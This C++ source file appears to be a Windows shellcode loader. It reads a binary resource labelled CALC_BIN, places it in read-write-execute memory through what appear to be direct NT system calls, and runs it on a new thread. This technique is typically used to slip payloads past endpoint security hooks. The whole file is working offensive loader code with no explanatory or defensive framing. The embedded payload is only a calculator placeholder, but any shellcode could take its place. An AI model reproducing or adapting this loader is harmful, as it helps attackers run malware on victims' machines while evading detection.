#include <iostream>
#include <Windows.h>
#include "syscalls.h"
#include "resource.h"


int main() {
    // Insert shellcode
    HRSRC codeResource = FindResource(NULL, MAKEINTRESOURCE(IDR_CALC_BIN1), L"CALC_BIN");
    DWORD codeSize = SizeofResource(NULL, codeResource);
    HGLOBAL codeResourceData = LoadResource(NULL, codeResource);
    LPVOID codeData = LockResource(codeResourceData);

    LPVOID allocation_start = nullptr;
    SIZE_T allocation_size = codeSize;
    HANDLE hThread = nullptr;

    // Allocate Virtual Memory
    NtAllocateVirtualMemory(GetCurrentProcess(), &allocation_start, 0, &allocation_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // Copy shellcode into allocated memory
    NtWriteVirtualMemory(GetCurrentProcess(), allocation_start, codeData, codeSize, NULL);

    // Execute shellcode in memory
    NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), (LPTHREAD_START_ROUTINE)allocation_start, NULL, FALSE, NULL, NULL, NULL, NULL);

    // Wait for the end of the thread and close the handle
    NtWaitForSingleObject(hThread, FALSE, NULL);
    NtClose(hThread);

    return 0;
}